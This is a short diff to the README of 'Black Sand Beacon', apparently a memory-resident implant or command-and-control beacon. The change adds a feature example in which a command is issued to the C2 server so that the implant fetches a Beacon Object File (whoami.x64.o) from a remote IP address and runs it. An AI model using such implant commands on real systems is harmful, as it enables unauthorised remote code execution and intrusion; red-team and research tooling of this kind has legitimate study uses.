@@ -7,6 +7,8 @@ Black Sand Beacon — a lightweight, memory-resident micro beacon or implant for
 
 - Command execution
 - Bof Execution
+  - issue_command_to_c2 linux bof:https://10.10.14.57/whoami.x64.o
+
 
 
 ## 📱 System Architecture
